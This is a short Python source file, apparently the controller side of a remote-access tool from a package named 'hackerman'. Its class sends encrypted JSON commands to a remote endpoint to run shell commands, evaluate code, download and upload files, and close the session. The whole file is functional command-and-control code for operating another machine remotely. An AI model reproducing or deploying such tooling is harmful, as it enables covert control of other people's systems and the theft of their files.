from hackerman import utils
import json

class BaseHandler(object):
	def __init__(self, transport, crypt):
		self.conn = transport
		self.encrypt = crypt.encrypt
		self.decrypt = crypt.decrypt
	def send_cmd(self, cmd):
		txt = json.dumps(cmd)
		enc = self.encrypt(txt.encode())

		self.conn.send(enc)
		dat = self.conn.recv()

		dec = self.decrypt(dat)
		res = json.loads(dec.decode())

		return res
	def sh(self, cmd):
		msg = {"type":"sh", 'cmd':cmd}
		return utils.b64d(self.send_cmd(msg)['res'])
	def eval(self, cmd):
		msg = {'type':'eval','cmd':cmd}
		return self.send_cmd(msg)['res']
	def dl(self, fn):
		msg = {'type':'dl','fn':fn}
		return utils.b64d(self.send_cmd(msg)['res'])
	def ul(self, fn, fd):
		msg = {'type':'ul','fn':fn,'fd':utils.b64e(fd)}
		return self.send_cmd(msg)['res']
	def exit(self):
		msg = {'type':'exit'}
		return self.send_cmd(msg)['res']